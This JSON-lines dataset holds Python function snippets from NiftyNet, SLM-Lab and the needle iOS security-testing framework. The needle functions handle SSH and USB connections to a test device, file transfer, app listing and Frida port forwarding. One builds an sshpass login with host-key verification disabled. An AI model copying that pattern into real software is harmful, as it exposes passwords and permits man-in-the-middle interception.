{"docstring": "\"\"\"\n\n:param input_chns: int, number of input channel\n:return: tuple, with series of convolutional layers\n\"\"\"\n", "func_signal": "def create(self, input_chns):\n", "code": "if self.n_output_chns == input_chns:\n    b1 = self.Conv(self.bottle_neck_chns,\n                   kernel_size=1,\n                   stride=self.stride)\n    b2 = self.Conv(self.bottle_neck_chns, kernel_size=3)\n    b3 = self.Conv(self.n_output_chns, 1)\n    return BottleneckBlockDesc1(conv=[b1, b2, b3])\nelse:\n    b1 = BNLayer()\n    b2 = self.Conv(self.bottle_neck_chns,\n                   kernel_size=1,\n                   stride=self.stride,\n                   acti_func=None,\n                   feature_normalization=None)\n    b3 = self.Conv(self.bottle_neck_chns, kernel_size=3)\n    b4 = self.Conv(self.n_output_chns, kernel_size=1)\n    b5 = self.Conv(self.n_output_chns,\n                   kernel_size=1,\n                   stride=self.stride,\n                   acti_func=None,\n                   feature_normalization=None)\n    return BottleneckBlockDesc2(common_bn=b1,\n                                conv=[b2, b3, b4],\n                                conv_shortcut=b5)", "path": "NiftyNet/niftynet/network/resnet.py", "commit_date": "2019-12-18 00:00:00", "repo_name": "NifTK/NiftyNet", "stars": 1355, "license": "apache-2.0", "language": "python", "size": 11529}
{"docstring": "'''\ndefine the 2d reader\n:return: 2d reader\n'''\n", "func_signal": "def get_2d_reader():\n", "code": "reader = ImageReader(['image'])\nreader.initialise(MOD_2D_DATA, MOD_2D_TASK, mod_2d_list)\nreturn reader", "path": "NiftyNet/tests/windows_aggregator_resize_v2_test.py", "commit_date": "2019-08-09 00:00:00", "repo_name": "NifTK/NiftyNet", "stars": 1355, "license": "apache-2.0", "language": "python", "size": 11529}
{"docstring": "'''\ndefine the 2d reader\n:return: 2d reader\n'''\n", "func_signal": "def get_2d_reader():\n", "code": "reader = ImageReader(['image'])\nreader.initialise(MOD_2D_DATA, MOD_2D_TASK, mod_2d_list)\nreturn reader", "path": "NiftyNet/tests/windows_aggregator_identity_v2_test.py", "commit_date": "2019-08-09 00:00:00", "repo_name": "NifTK/NiftyNet", "stars": 1355, "license": "apache-2.0", "language": "python", "size": 11529}
{"docstring": "\"\"\"\n\n:return: tuple, containing all the Bottleneck blocks composing the DownRes block\n\"\"\"\n", "func_signal": "def create(self):\n", "code": "blocks = []\nblocks += [BottleneckBlock(self.n_output_chns, self.stride, self.Conv)]\nfor it in range(1, self.count):\n    blocks += [BottleneckBlock(self.n_output_chns, 1, self.Conv)]\nreturn DownResBlockDesc(blocks=blocks)", "path": "NiftyNet/niftynet/network/resnet.py", "commit_date": "2019-12-18 00:00:00", "repo_name": "NifTK/NiftyNet", "stars": 1355, "license": "apache-2.0", "language": "python", "size": 11529}
{"docstring": "\"\"\"Connect to the device (both SSH and AGENT).\"\"\"\n# Using USB, setup port forwarding first\n", "func_signal": "def connect(self):\n", "code": "if self.is_usb():\n    self._portforward_usb_start()\n    self._portforward_agent_start()\n# Setup channels\nself._connect_agent()\nself.ssh = self._connect_ssh()", "path": "needle/needle/core/device/device.py", "commit_date": "2018-07-26 00:00:00", "repo_name": "WithSecureLabs/needle", "stars": 1298, "license": "other", "language": "python", "size": 5419}
{"docstring": "\"\"\"List all apps installed and let the user choose which one to target.\"\"\"\n# Show menu to user\n", "func_signal": "def select_target_app(self):\n", "code": "self.printer.notify('Apps found:')\napp_name = choose_from_list(self._applist.keys())\nreturn app_name", "path": "needle/needle/core/device/device.py", "commit_date": "2018-07-26 00:00:00", "repo_name": "WithSecureLabs/needle", "stars": 1298, "license": "other", "language": "python", "size": 5419}
{"docstring": "\"\"\"Stop USB port forwarding.\"\"\"\n", "func_signal": "def _portforward_usb_stop(self):\n", "code": "self.printer.debug('Stopping USB port forwarding')\nself.local_op.command_subproc_stop(self._port_forward_ssh)", "path": "needle/needle/core/device/device.py", "commit_date": "2018-07-26 00:00:00", "repo_name": "WithSecureLabs/needle", "stars": 1298, "license": "other", "language": "python", "size": 5419}
{"docstring": "\"\"\"Spawn a system shell on the device.\"\"\"\n", "func_signal": "def shell(self):\n", "code": "cmd = 'sshpass -p \"{password}\" ssh {hostverification} -p {port} {username}@{ip}'.format(password=self._password,\n                                                                                        hostverification=Constants.DISABLE_HOST_VERIFICATION,\n                                                                                        port=self._port,\n                                                                                        username=self._username,\n                                                                                        ip=self._ip)\nself.local_op.command_interactive(cmd)", "path": "needle/needle/core/device/device.py", "commit_date": "2018-07-26 00:00:00", "repo_name": "WithSecureLabs/needle", "stars": 1298, "license": "other", "language": "python", "size": 5419}
{"docstring": "\"\"\"Create temp folder, and check if all tools are available\"\"\"\n# Setup temp folder\n", "func_signal": "def setup(self):\n", "code": "self.printer.debug(\"Creating temp folder: %s\" % self.TEMP_FOLDER)\nself.remote_op.dir_create(self.TEMP_FOLDER)\n# Detect OS version\nif not self._ios_version:\n    self._ios_version = self.agent.exec_command_agent(Constants.AGENT_CMD_OS_VERSION).strip()", "path": "needle/needle/core/device/device.py", "commit_date": "2018-07-26 00:00:00", "repo_name": "WithSecureLabs/needle", "stars": 1298, "license": "other", "language": "python", "size": 5419}
{"docstring": "\"\"\"Disconnect from the device (both SSH and AGENT).\"\"\"\n# Close channels\n", "func_signal": "def disconnect(self):\n", "code": "self._disconnect_ssh()\nself._disconnect_agent()\n# Using USB, stop port forwarding first\nif self._port_forward_ssh:\n    self._portforward_usb_stop()\n    self._portforward_agent_stop()", "path": "needle/needle/core/device/device.py", "commit_date": "2018-07-26 00:00:00", "repo_name": "WithSecureLabs/needle", "stars": 1298, "license": "other", "language": "python", "size": 5419}
{"docstring": "\"\"\"Stop local port forwarding for Frida server.\"\"\"\n", "func_signal": "def _portforward_frida_stop(self):\n", "code": "self.printer.debug('{} Stopping port forwarding'.format(\"FRIDA\"))\nif self._frida_server:\n    self._frida_server.stop()", "path": "needle/needle/core/device/device.py", "commit_date": "2018-07-26 00:00:00", "repo_name": "WithSecureLabs/needle", "stars": 1298, "license": "other", "language": "python", "size": 5419}
{"docstring": "# Pull TrustStore.sqlite3\n", "func_signal": "def module_run(self):\n", "code": "self.pull_ts()\n\n# List certificates\nadv = imp.load_source(\"TrustStore\", self.TOOLS_LOCAL['ADVTRUSTSTORE'])\ntstore = adv.TrustStore(self.db)\ncert_list = tstore.list_certificates()\n\n# Print Certificates\nif cert_list:\n    self.printer.notify(\"The following certificates are installed on the device:\")\n    for el in cert_list:\n        self.printer.notify(el.get_subject().strip())\nelse:\n    self.printer.warning(\"No certificates found\")", "path": "needle/needle/modules/comms/certs/list_ca.py", "commit_date": "2016-11-14 00:00:00", "repo_name": "WithSecureLabs/needle", "stars": 1298, "license": "other", "language": "python", "size": 5419}
{"docstring": "\"\"\"Close the SSH connection, if available.\"\"\"\n", "func_signal": "def _disconnect_ssh(self):\n", "code": "self.printer.verbose(\"[SSH] Disconnecting...\")\nif self.ssh:\n    self.ssh.close()", "path": "needle/needle/core/device/device.py", "commit_date": "2018-07-26 00:00:00", "repo_name": "WithSecureLabs/needle", "stars": 1298, "license": "other", "language": "python", "size": 5419}
{"docstring": "\"\"\"Setup local port forward to enable communication with the Frida server running on the device.\"\"\"\n", "func_signal": "def _portforward_frida_start(self):\n", "code": "self.printer.debug('{} Setting up port forwarding on port {}'.format(\"[FRIDA]\", Constants.FRIDA_PORT))\nlocalhost = '127.0.0.1'\nself._frida_server = SSHTunnelForwarder(\n    (self._ip, int(self._port)),\n    ssh_username=self._username,\n    ssh_password=self._password,\n    local_bind_address=(localhost, Constants.FRIDA_PORT),\n    remote_bind_address=(localhost, Constants.FRIDA_PORT),\n)\nself._frida_server.start()", "path": "needle/needle/core/device/device.py", "commit_date": "2018-07-26 00:00:00", "repo_name": "WithSecureLabs/needle", "stars": 1298, "license": "other", "language": "python", "size": 5419}
{"docstring": "\"\"\"Execute a shell command on the device, then parse/print output.\"\"\"\n", "func_signal": "def _exec_command_ssh(self, cmd, internal):\n", "code": "def hotfix_67():\n    # TODO: replace with a more long-term fix\n    import time\n    timeout = 30\n    endtime = time.time() + timeout\n    while not stdout.channel.eof_received:\n        time.sleep(1)\n        if time.time() > endtime:\n            stdout.channel.close()\n            break\n\n# Paramiko Exec Command\nstdin, stdout, stderr = self.ssh.exec_command(cmd)\nhotfix_67()\n# Parse STDOUT/ERR\nout = stdout.readlines()\nerr = stderr.readlines()\nif internal:\n    # For processing, don't display output\n    if err:\n        # Show error and abort run\n        err_str = ''.join(err)\n        raise Exception(err_str)\nelse:\n    # Display output\n    if out: map(lambda x: print('\\t%s' % x, end=''), out)\n    if err: map(lambda x: print('\\t%s%s%s' % (Colors.R, x, Colors.N), end=''), err)\nreturn out, err", "path": "needle/needle/core/device/device.py", "commit_date": "2018-07-26 00:00:00", "repo_name": "WithSecureLabs/needle", "stars": 1298, "license": "other", "language": "python", "size": 5419}
{"docstring": "# Bundle\n", "func_signal": "def module_run(self):\n", "code": "self.printer.notify('{:<20}: {:<30}'.format('Name', self.APP_METADATA['name']))\nself.printer.notify('{:<20}: {:<30}'.format('Binary Name', self.APP_METADATA['binary_name']))\nself.printer.notify('{:<20}: {:<30}'.format('Bundle Executable', self.APP_METADATA['bundle_exe']))\nself.printer.notify('{:<20}: {:<30}'.format('Bundle ID', self.APP_METADATA['bundle_id']))\nself.printer.notify('{:<20}: {:<30}'.format('Bundle Type', self.APP_METADATA['bundle_type']))\nself.printer.notify('{:<20}: {:<30}'.format('UUID', self.APP_METADATA['uuid']))\nself.printer.notify('{:<20}: {:<30}'.format('Team ID', self.APP_METADATA['team_id']))\nself.printer.notify('{:<20}: {:<30}'.format('Signer Identity', self.APP_METADATA['signer_identity']))\n\n# Paths\nself.printer.notify('{:<20}: {:<30}'.format('Bundle Directory', self.APP_METADATA['bundle_directory']))\nself.printer.notify('{:<20}: {:<30}'.format('Binary Directory', self.APP_METADATA['binary_directory']))\nself.printer.notify('{:<20}: {:<30}'.format('Binary Path', self.APP_METADATA['binary_path']))\nself.printer.notify('{:<20}: {:<30}'.format('Data Directory', self.APP_METADATA['data_directory']))\n\n# Compilation\nself.printer.notify('{:<20}: {:<30}'.format('Bundle Package Type', self.APP_METADATA['bundle_package_type']))\nself.printer.notify('{:<20}: {:<30}'.format('App Version', self.APP_METADATA['app_version']))\nself.printer.notify('{:<20}: {:<30}'.format('Architectures', ', '.join(self.APP_METADATA['architectures'])))\nself.printer.notify('{:<20}: {:<30}'.format('Platform Version', self.APP_METADATA['platform_version']))\nself.printer.notify('{:<20}: {:<30}'.format('SDK Version', self.APP_METADATA['sdk_version']))\nself.printer.notify('{:<20}: {:<30}'.format('Minimum OS', self.APP_METADATA['minimum_os']))\n\n# URL Handlers\nself._print_url_handlers(self.APP_METADATA['url_handlers'], ident=0)\n\n# Apple Transport Security Settings\nself._print_ats(self.APP_METADATA['ats_settings'], ident=0)\n\n# Entitlements\nentitlements = self.APP_METADATA['entitlements']\nself._print_entitlements(entitlements)\n\n# App Extensions\nif self.APP_METADATA['extensions']:\n    for app_extension in self.APP_METADATA['extensions']:\n        print\n        self.printer.notify('{:<20}'.format('Application Extension:',))\n\n        self.printer.notify('\\t\\t{:<40}: {:<20}'.format('Bundle Display Name', app_extension['bundle_displayname']))\n        self.printer.notify('\\t\\t{:<40}: {:<20}'.format('Bundle Executable', app_extension['bundle_exe']))\n        self.printer.notify('\\t\\t{:<40}: {:<20}'.format('Bundle ID', app_extension['bundle_id']))\n        self.printer.notify('\\t\\t{:<40}: {:<20}'.format('Bundle Version', app_extension['bundle_version']))\n        self.printer.notify('\\t\\t{:<40}: {:<20}'.format('Bundle Package Type', app_extension['bundle_package_type']))\n        self.printer.notify('\\t\\t{:<40}: {:<20}'.format('Platform Version', app_extension['platform_version']))\n        self._print_url_handlers(app_extension['url_handlers'], ident=2)\n        self._print_ats(self.APP_METADATA['ats_settings'], ident=2)\n\n        extension_data = app_extension['extension_data']\n        for k, v in extension_data.items():\n            self.printer.notify('\\t\\t{:<40}: {:<20}'.format(k, v))\nelse:\n    self.printer.info('No Application Extensions found')", "path": "needle/needle/modules/binary/info/metadata.py", "commit_date": "2017-05-30 00:00:00", "repo_name": "WithSecureLabs/needle", "stars": 1298, "license": "other", "language": "python", "size": 5419}
{"docstring": "\"\"\"Remove temp folder from device.\"\"\"\n", "func_signal": "def cleanup(self):\n", "code": "self.printer.debug(\"Cleaning up remote temp folder: %s\" % self.TEMP_FOLDER)\nself.remote_op.dir_delete(self.TEMP_FOLDER)", "path": "needle/needle/core/device/device.py", "commit_date": "2018-07-26 00:00:00", "repo_name": "WithSecureLabs/needle", "stars": 1298, "license": "other", "language": "python", "size": 5419}
{"docstring": "# Setup params\n", "func_signal": "def __init__(self, ip, port, agent_port, username, password, pub_key_auth, tools):\n", "code": "self._ip = ip\nself._port = port\nself._agent_port = agent_port\nself._username = username\nself._password = password\nself._pub_key_auth = bool(pub_key_auth)\nself._tools_local = tools\n# Init related objects\nself.app = App(self)\nself.local_op = LocalOperations()\nself.remote_op = RemoteOperations(self)\nself.printer = Printer()\nself.agent = NeedleAgent(self)", "path": "needle/needle/core/device/device.py", "commit_date": "2018-07-26 00:00:00", "repo_name": "WithSecureLabs/needle", "stars": 1298, "license": "other", "language": "python", "size": 5419}
{"docstring": "# Setup tab completion\n", "func_signal": "def launch_ui(args):\n", "code": "try:\n    import readline\nexcept ImportError:\n    print('%s[!] Module \\'readline\\' not available. Tab complete disabled.%s' % (Colors.R, Colors.N))\nelse:\n    import rlcompleter\n    if 'libedit' in readline.__doc__:\n        readline.parse_and_bind('bind ^I rl_complete')\n    else:\n        readline.parse_and_bind('tab: complete')\n        readline.set_completer_delims(re.sub('[/-]', '', readline.get_completer_delims()))\n# Instantiate the UI object\nx = cli.CLI(cli.Mode.CONSOLE)\n# check for and run version check\nif args.check:\n    if not x.version_check(): return\n# Check for and run script session\nif args.script_file:\n    x.do_resource(args.script_file)\n# Run the UI\ntry: \n    x.cmdloop()\nexcept KeyboardInterrupt: \n    print('')", "path": "needle/needle/needle.py", "commit_date": "2017-05-09 00:00:00", "repo_name": "WithSecureLabs/needle", "stars": 1298, "license": "other", "language": "python", "size": 5419}
{"docstring": "\"\"\"Setup USB port forwarding with TCPRelay.\"\"\"\n# Check if the user chose a valid port\n", "func_signal": "def _portforward_usb_start(self):\n", "code": "if str(self._port) == '22':\n    raise Exception('Chosen port must be different from 22 in order to use USB over SSH')\n# Setup the forwarding\nself.printer.debug('Setting up USB port forwarding on port %s' % self._port)\ncmd = '{app} -t 22:{port}'.format(app=self._tools_local['TCPRELAY'], port=self._port)\nself._port_forward_ssh = self.local_op.command_subproc_start(cmd)", "path": "needle/needle/core/device/device.py", "commit_date": "2018-07-26 00:00:00", "repo_name": "WithSecureLabs/needle", "stars": 1298, "license": "other", "language": "python", "size": 5419}
{"docstring": "\"\"\"Pull a file from the device.\"\"\"\n", "func_signal": "def pull(self, src, dst):\n", "code": "self.printer.info(\"Pulling: %s -> %s\" % (src, dst))\nself.remote_op.download(src, dst)", "path": "needle/needle/core/device/device.py", "commit_date": "2018-07-26 00:00:00", "repo_name": "WithSecureLabs/needle", "stars": 1298, "license": "other", "language": "python", "size": 5419}
{"docstring": "\"\"\"Push a file on the device.\"\"\"\n", "func_signal": "def push(self, src, dst):\n", "code": "self.printer.info(\"Pushing: %s -> %s\" % (src, dst))\nself.remote_op.upload(src, dst)", "path": "needle/needle/core/device/device.py", "commit_date": "2018-07-26 00:00:00", "repo_name": "WithSecureLabs/needle", "stars": 1298, "license": "other", "language": "python", "size": 5419}
{"docstring": "\"\"\"Stop local port forwarding for Needle server.\"\"\"\n", "func_signal": "def _portforward_agent_stop(self):\n", "code": "self.printer.debug('{} Stopping port forwarding'.format(Constants.AGENT_TAG))\nif self._port_forward_agent:\n    self._port_forward_agent.stop()", "path": "needle/needle/core/device/device.py", "commit_date": "2018-07-26 00:00:00", "repo_name": "WithSecureLabs/needle", "stars": 1298, "license": "other", "language": "python", "size": 5419}
{"docstring": "\"\"\"Retrieve all the 3rd party apps installed on the device.\"\"\"\n", "func_signal": "def _list_apps(self, hide_system_apps=False):\n", "code": "agent_list = self.agent.exec_command_agent(Constants.AGENT_CMD_LIST_APPS)\nself._applist = Utils.string_to_json(agent_list)\nif hide_system_apps:\n    self._applist = {k: v for k, v in self._applist.iteritems() if v[\"BundleType\"] == \"User\"}", "path": "needle/needle/core/device/device.py", "commit_date": "2018-07-26 00:00:00", "repo_name": "WithSecureLabs/needle", "stars": 1298, "license": "other", "language": "python", "size": 5419}
{"docstring": "'''\nCalculate N-step returns, and advs = nstep_rets - v_preds, v_targets = nstep_rets\nSee n-step advantage under http://rail.eecs.berkeley.edu/deeprlcourse-fa17/f17docs/lecture_5_actor_critic_pdf.pdf\n'''\n", "func_signal": "def calc_nstep_advs_v_targets(self, batch, v_preds):\n", "code": "next_states = batch['next_states'][-1]\nif not self.body.env.is_venv:\n    next_states = next_states.unsqueeze(dim=0)\nwith torch.no_grad():\n    next_v_pred = self.calc_v(next_states, use_cache=False)\nv_preds = v_preds.detach()  # adv does not accumulate grad\nif self.body.env.is_venv:\n    v_preds = math_util.venv_pack(v_preds, self.body.env.num_envs)\nnstep_rets = math_util.calc_nstep_returns(batch['rewards'], batch['dones'], next_v_pred, self.gamma, self.num_step_returns)\nadvs = nstep_rets - v_preds\nv_targets = nstep_rets\nif self.body.env.is_venv:\n    advs = math_util.venv_unpack(advs)\n    v_targets = math_util.venv_unpack(v_targets)\nlogger.debug(f'advs: {advs}\\nv_targets: {v_targets}')\nreturn advs, v_targets", "path": "SLM-Lab/slm_lab/agent/algorithm/actor_critic.py", "commit_date": "2020-04-14 00:00:00", "repo_name": "kengz/SLM-Lab", "stars": 1203, "license": "mit", "language": "python", "size": 4278}
{"docstring": "'''Adds an experience to the memory.\nChecks that memory size = 1, and checks that the experience values are equal to the experience added'''\n", "func_signal": "def test_add_experience(self, test_on_policy_batch_memory):\n", "code": "memory = test_on_policy_batch_memory[0]\nmemory.reset()\nexperiences = test_on_policy_batch_memory[2]\nexp = experiences[0]\nmemory.add_experience(*exp)\nassert memory.size == 1\nassert len(memory.states) == 1\n# Handle states and actions with multiple dimensions\nassert np.array_equal(memory.states[-1], exp[0])\nassert memory.rewards[-1] == exp[1]\nassert memory.actions[-1] == exp[2]\nassert np.array_equal(memory.next_states[-1], exp[3])\nassert memory.dones[-1] == exp[4]", "path": "SLM-Lab/test/agent/memory/test_onpolicy_memory.py", "commit_date": "2019-04-21 00:00:00", "repo_name": "kengz/SLM-Lab", "stars": 1203, "license": "mit", "language": "python", "size": 4278}
{"docstring": "'''Tests memory reset.\nAdds 2 experiences, then resets the memory and checks if all appropriate values have been zeroed'''\n", "func_signal": "def test_reset(self, test_on_policy_batch_memory):\n", "code": "memory = test_on_policy_batch_memory[0]\nexperiences = test_on_policy_batch_memory[2]\nassert memory_reset_util(memory, experiences)", "path": "SLM-Lab/test/agent/memory/test_onpolicy_memory.py", "commit_date": "2019-04-21 00:00:00", "repo_name": "kengz/SLM-Lab", "stars": 1203, "license": "mit", "language": "python", "size": 4278}
{"docstring": "'''Tests memory reset.\nAdds 2 experiences, then resets the memory and checks if all appropriate values have been zeroed'''\n", "func_signal": "def test_reset(self, test_on_policy_episodic_memory):\n", "code": "memory = test_on_policy_episodic_memory[0]\nexperiences = test_on_policy_episodic_memory[2]\nassert memory_reset_util(memory, experiences)", "path": "SLM-Lab/test/agent/memory/test_onpolicy_memory.py", "commit_date": "2019-04-21 00:00:00", "repo_name": "kengz/SLM-Lab", "stars": 1203, "license": "mit", "language": "python", "size": 4278}
{"docstring": "'''Tests that a sample of batch size is returned with the correct number of episodes'''\n", "func_signal": "def test_multiple_epis_samples(self, test_on_policy_episodic_memory):\n", "code": "memory = test_on_policy_episodic_memory[0]\nmemory.reset()\nbatch_size = test_on_policy_episodic_memory[1]\nexperiences = test_on_policy_episodic_memory[2]\nsize = len(experiences)\nfor i in range(3):\n    for e in experiences:\n        memory.add_experience(*e)\nbatch = memory.sample()\nassert len(batch['states']) == 3\nassert len(batch['rewards']) == 3\nassert len(batch['next_states']) == 3\nassert len(batch['actions']) == 3\nassert len(batch['dones']) == 3\nassert len(batch['states'][0]) == size\nassert len(batch['states'][1]) == size\nassert len(batch['states'][2]) == size\nassert len(memory.states) == 0", "path": "SLM-Lab/test/agent/memory/test_onpolicy_memory.py", "commit_date": "2019-04-21 00:00:00", "repo_name": "kengz/SLM-Lab", "stars": 1203, "license": "mit", "language": "python", "size": 4278}
{"docstring": "'''Efficiently forward to get pdparam and v by batch for loss computation'''\n", "func_signal": "def calc_pdparam_v(self, batch):\n", "code": "states = batch['states']\nif self.body.env.is_venv:\n    states = math_util.venv_unpack(states)\npdparam = self.calc_pdparam(states)\nv_pred = self.calc_v(states)  # uses self.v_pred from calc_pdparam if self.shared\nreturn pdparam, v_pred", "path": "SLM-Lab/slm_lab/agent/algorithm/actor_critic.py", "commit_date": "2020-04-14 00:00:00", "repo_name": "kengz/SLM-Lab", "stars": 1203, "license": "mit", "language": "python", "size": 4278}
{"docstring": "'''\nThe pdparam will be the logits for discrete prob. dist., or the mean and std for continuous prob. dist.\n'''\n", "func_signal": "def calc_pdparam(self, x, net=None):\n", "code": "out = super().calc_pdparam(x, net=net)\nif self.shared:\n    assert ps.is_list(out), f'Shared output should be a list [pdparam, v]'\n    if len(out) == 2:  # single policy\n        pdparam = out[0]\n    else:  # multiple-task policies, still assumes 1 value\n        pdparam = out[:-1]\n    self.v_pred = out[-1].view(-1)  # cache for loss calc to prevent double-pass\nelse:  # out is pdparam\n    pdparam = out\nreturn pdparam", "path": "SLM-Lab/slm_lab/agent/algorithm/actor_critic.py", "commit_date": "2020-04-14 00:00:00", "repo_name": "kengz/SLM-Lab", "stars": 1203, "license": "mit", "language": "python", "size": 4278}
{"docstring": "'''\nForward-pass to calculate the predicted state-value from critic_net.\n'''\n", "func_signal": "def calc_v(self, x, net=None, use_cache=True):\n", "code": "if self.shared:  # output: policy, value\n    if use_cache:  # uses cache from calc_pdparam to prevent double-pass\n        v_pred = self.v_pred\n    else:\n        net = self.net if net is None else net\n        v_pred = net(x)[-1].view(-1)\nelse:\n    net = self.critic_net if net is None else net\n    v_pred = net(x).view(-1)\nreturn v_pred", "path": "SLM-Lab/slm_lab/agent/algorithm/actor_critic.py", "commit_date": "2020-04-14 00:00:00", "repo_name": "kengz/SLM-Lab", "stars": 1203, "license": "mit", "language": "python", "size": 4278}
{"docstring": "'''Adds an experience to the memory.\nChecks that memory size = 1, and checks that the experience values are equal to the experience added'''\n", "func_signal": "def test_add_experience(self, test_on_policy_episodic_memory):\n", "code": "memory = test_on_policy_episodic_memory[0]\nmemory.reset()\nexperiences = test_on_policy_episodic_memory[2]\nexp = experiences[0]\nmemory.add_experience(*exp)\nassert memory.size == 1\nassert len(memory.states) == 0\n# Handle states and actions with multiple dimensions\nassert np.array_equal(memory.cur_epi_data['states'][-1], exp[0])\nassert memory.cur_epi_data['rewards'][-1] == exp[1]\nassert memory.cur_epi_data['actions'][-1] == exp[2]\nassert np.array_equal(memory.cur_epi_data['next_states'][-1], exp[3])\nassert memory.cur_epi_data['dones'][-1] == exp[4]", "path": "SLM-Lab/test/agent/memory/test_onpolicy_memory.py", "commit_date": "2019-04-21 00:00:00", "repo_name": "kengz/SLM-Lab", "stars": 1203, "license": "mit", "language": "python", "size": 4278}
{"docstring": "'''Method to sample next_states from states, with proper guard for next_state idx being out of bound'''\n# idxs for next state is state idxs with offset, modded\n", "func_signal": "def sample_next_states(head, max_size, ns_idx_offset, batch_idxs, states, ns_buffer):\n", "code": "ns_batch_idxs = (batch_idxs + ns_idx_offset) % max_size\n# if head < ns_idx <= head + ns_idx_offset, ns is stored in ns_buffer\nns_batch_idxs = ns_batch_idxs % max_size\nbuffer_ns_locs = np.argwhere(\n    (head < ns_batch_idxs) & (ns_batch_idxs <= head + ns_idx_offset)).flatten()\n# find if there is any idxs to get from buffer\nto_replace = buffer_ns_locs.size != 0\nif to_replace:\n    # extract the buffer_idxs first for replacement later\n    # given head < ns_idx <= head + offset, and valid buffer idx is [0, offset)\n    # get 0 < ns_idx - head <= offset, or equiv.\n    # get -1 < ns_idx - head - 1 <= offset - 1, i.e.\n    # get 0 <= ns_idx - head - 1 < offset, hence:\n    buffer_idxs = ns_batch_idxs[buffer_ns_locs] - head - 1\n    # set them to 0 first to allow sampling, then replace later with buffer\n    ns_batch_idxs[buffer_ns_locs] = 0\n# guard all against overrun idxs from offset\nns_batch_idxs = ns_batch_idxs % max_size\nnext_states = util.batch_get(states, ns_batch_idxs)\nif to_replace:\n    # now replace using buffer_idxs and ns_buffer\n    buffer_ns = util.batch_get(ns_buffer, buffer_idxs)\n    next_states[buffer_ns_locs] = buffer_ns\nreturn next_states", "path": "SLM-Lab/slm_lab/agent/memory/replay.py", "commit_date": "2019-05-21 00:00:00", "repo_name": "kengz/SLM-Lab", "stars": 1203, "license": "mit", "language": "python", "size": 4278}
{"docstring": "'''\nCalculate GAE, and advs = GAE, v_targets = advs + v_preds\nSee GAE from Schulman et al. https://arxiv.org/pdf/1506.02438.pdf\n'''\n", "func_signal": "def calc_gae_advs_v_targets(self, batch, v_preds):\n", "code": "next_states = batch['next_states'][-1]\nif not self.body.env.is_venv:\n    next_states = next_states.unsqueeze(dim=0)\nwith torch.no_grad():\n    next_v_pred = self.calc_v(next_states, use_cache=False)\nv_preds = v_preds.detach()  # adv does not accumulate grad\nif self.body.env.is_venv:\n    v_preds = math_util.venv_pack(v_preds, self.body.env.num_envs)\n    next_v_pred = next_v_pred.unsqueeze(dim=0)\nv_preds_all = torch.cat((v_preds, next_v_pred), dim=0)\nadvs = math_util.calc_gaes(batch['rewards'], batch['dones'], v_preds_all, self.gamma, self.lam)\nv_targets = advs + v_preds\nadvs = math_util.standardize(advs)  # standardize only for advs, not v_targets\nif self.body.env.is_venv:\n    advs = math_util.venv_unpack(advs)\n    v_targets = math_util.venv_unpack(v_targets)\nlogger.debug(f'advs: {advs}\\nv_targets: {v_targets}')\nreturn advs, v_targets", "path": "SLM-Lab/slm_lab/agent/algorithm/actor_critic.py", "commit_date": "2020-04-14 00:00:00", "repo_name": "kengz/SLM-Lab", "stars": 1203, "license": "mit", "language": "python", "size": 4278}
{"docstring": "'''Tests that a sample of batch size is returned with the correct dimensions'''\n", "func_signal": "def test_sample(self, test_on_policy_batch_memory):\n", "code": "memory = test_on_policy_batch_memory[0]\nmemory.reset()\nbatch_size = test_on_policy_batch_memory[1]\nexperiences = test_on_policy_batch_memory[2]\nsize = len(experiences)\nfor e in experiences:\n    memory.add_experience(*e)\nbatch = memory.sample()\nassert len(batch['states']) == size\nassert len(batch['rewards']) == size\nassert len(batch['next_states']) == size\nassert len(batch['actions']) == size\nassert len(batch['dones']) == size\nassert len(memory.states) == 0", "path": "SLM-Lab/test/agent/memory/test_onpolicy_memory.py", "commit_date": "2019-04-21 00:00:00", "repo_name": "kengz/SLM-Lab", "stars": 1203, "license": "mit", "language": "python", "size": 4278}
{"docstring": "'''\nReturns a batch of batch_size samples. Batch is stored as a dict.\nKeys are the names of the different elements of an experience. Values are an array of the corresponding sampled elements\ne.g.\nbatch = {\n    'states'     : states,\n    'actions'    : actions,\n    'rewards'    : rewards,\n    'next_states': next_states,\n    'dones'      : dones}\n'''\n", "func_signal": "def sample(self):\n", "code": "self.batch_idxs = self.sample_idxs(self.batch_size)\nbatch = {}\nfor k in self.data_keys:\n    if k == 'next_states':\n        batch[k] = sample_next_states(self.head, self.max_size, self.ns_idx_offset, self.batch_idxs, self.states, self.ns_buffer)\n    else:\n        batch[k] = util.batch_get(getattr(self, k), self.batch_idxs)\nreturn batch", "path": "SLM-Lab/slm_lab/agent/memory/replay.py", "commit_date": "2019-05-21 00:00:00", "repo_name": "kengz/SLM-Lab", "stars": 1203, "license": "mit", "language": "python", "size": 4278}
{"docstring": "'''Initialize other algorithm parameters'''\n# set default\n", "func_signal": "def init_algorithm_params(self):\n", "code": "util.set_attr(self, dict(\n    action_pdtype='default',\n    action_policy='default',\n    explore_var_spec=None,\n    entropy_coef_spec=None,\n    policy_loss_coef=1.0,\n    val_loss_coef=1.0,\n))\nutil.set_attr(self, self.algorithm_spec, [\n    'action_pdtype',\n    'action_policy',\n    # theoretically, AC does not have policy update; but in this implementation we have such option\n    'explore_var_spec',\n    'gamma',  # the discount factor\n    'lam',\n    'num_step_returns',\n    'entropy_coef_spec',\n    'policy_loss_coef',\n    'val_loss_coef',\n    'training_frequency',\n])\nself.to_train = 0\nself.action_policy = getattr(policy_util, self.action_policy)\nself.explore_var_scheduler = policy_util.VarScheduler(self.explore_var_spec)\nself.body.explore_var = self.explore_var_scheduler.start_val\nif self.entropy_coef_spec is not None:\n    self.entropy_coef_scheduler = policy_util.VarScheduler(self.entropy_coef_spec)\n    self.body.entropy_coef = self.entropy_coef_scheduler.start_val\n# Select appropriate methods to calculate advs and v_targets for training\nif self.lam is not None:\n    self.calc_advs_v_targets = self.calc_gae_advs_v_targets\nelif self.num_step_returns is not None:\n    # need to override training_frequency for nstep to be the same\n    self.training_frequency = self.num_step_returns\n    self.calc_advs_v_targets = self.calc_nstep_advs_v_targets\nelse:\n    self.calc_advs_v_targets = self.calc_ret_advs_v_targets", "path": "SLM-Lab/slm_lab/agent/algorithm/actor_critic.py", "commit_date": "2020-04-14 00:00:00", "repo_name": "kengz/SLM-Lab", "stars": 1203, "license": "mit", "language": "python", "size": 4278}
